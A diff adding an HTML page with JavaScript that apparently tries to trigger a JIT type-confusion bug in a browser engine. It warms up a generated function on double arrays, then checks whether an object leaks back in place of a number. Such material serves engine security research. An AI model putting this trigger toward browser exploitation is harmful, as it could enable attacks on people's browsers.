@@ -1,0 +1,51 @@
+<!DOCTYPE html><html><body><script>
+let dummy = { a: 1 };
+
+function create_and_warmup() {
+  let lines = [];
+  lines.push("function sink_cond(x, arr, obj, limit) {");
+  for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
+  
+  lines.push("  arr[0] = obj;");
+  lines.push("  let i = 0;");
+  lines.push("  let res = null;");
+  lines.push("  let dummy_var = 0;");
+  lines.push("  while ((res = arr[1]) !== null && i < limit) {");
+  for (let j = 0; j < 80; j++) {
+    lines.push(`    dummy_var = (dummy_var + ${j}) | 0;`);
+  }
+  lines.push("    i++;");
+  lines.push("  }");
+  lines.push("  return res;");
+  lines.push("}");
+  lines.push("return sink_cond;");
+  let fn = new Function(lines.join("\n"))();
+  
+  // Allocate pool of 1200 double arrays (no GC!)
+  let pool = [];
+  for (let i = 0; i < 1200; i++) {
+    pool.push([1.1, 2.2, 3.3]);
+  }
+  
+  // Warmup with transition every time
+  for (let i = 0; i < 1200; i++) {
+    fn(1000, pool[i], dummy, 1);
+  }
+  return fn;
+}
+
+async function main() {
+  let fn = create_and_warmup();
+  await new Promise(r => setTimeout(r, 2500));
+  
+  let victim = [1.1, 2.2, 3.3];
+  let res = fn(1000, victim, dummy, 1);
+  console.log("RESULT: type=" + (typeof res) + " val=" + res);
+  if (typeof res === "object") {
+    console.log("🔥🔥🔥 SINKHOLE SUCCESS! Object:", res, "🔥🔥🔥");
+  } else {
+    console.log("Result is still:", res);
+  }
+}
+main();
+</script></body></html>
